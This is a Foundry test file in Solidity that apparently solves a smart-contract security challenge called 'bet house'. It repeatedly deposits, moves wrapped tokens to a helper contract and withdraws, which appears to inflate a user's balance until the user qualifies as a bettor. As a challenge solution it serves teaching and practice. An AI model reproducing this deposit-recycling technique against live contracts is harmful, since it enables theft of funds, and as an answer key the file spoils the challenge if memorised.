// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {BetHouse, Pool, PoolToken} from "../src/challenge-34-bet-house/BetHouse.sol";
import {BetHouseHelper} from "../src/challenge-34-bet-house/BetHouseHelper.sol";

contract BetHouseTest is Test {
    PoolToken public wrappedToken;
    PoolToken public depositToken;
    Pool public pool;
    BetHouse public betHouse;
    BetHouseHelper public helper;

    address public alice = makeAddr("alice");

    function setUp() public {
        wrappedToken = new PoolToken("Wrapped Token", "WT");
        depositToken = new PoolToken("Pool Deposit Token", "PDT");

        pool = new Pool(address(wrappedToken), address(depositToken));
        betHouse = new BetHouse(address(pool));

        wrappedToken.transferOwnership(address(pool));
        depositToken.transferOwnership(address(this));

        depositToken.mint(alice, 5);

        vm.deal(alice, 10 ether);

        helper = new BetHouseHelper(address(pool), address(betHouse));

        assertEq(wrappedToken.totalSupply(), 0);
        assertEq(depositToken.totalSupply(), 5);
    }

    function testMakeAliceBettor() public {
        vm.startPrank(alice);
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        vm.stopPrank();

        vm.startPrank(alice);
        wrappedToken.transfer(address(helper), wrappedToken.balanceOf(alice));
        vm.stopPrank();

        vm.startPrank(alice);
        pool.withdrawAll();
        vm.stopPrank();

        vm.startPrank(alice);
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        vm.stopPrank();

        vm.startPrank(alice);
        wrappedToken.transfer(address(helper), wrappedToken.balanceOf(alice));
        vm.stopPrank();

        helper.lockAndBet(alice);

        assertTrue(betHouse.isBettor(alice));
    }

    function logUserBalances(string memory label, address user) internal view {
        console.log(" ");
        console.log("==========", label, "==========");
        console.log("user PDT:", depositToken.balanceOf(user));
        console.log("user WT:", wrappedToken.balanceOf(user));
    }
}
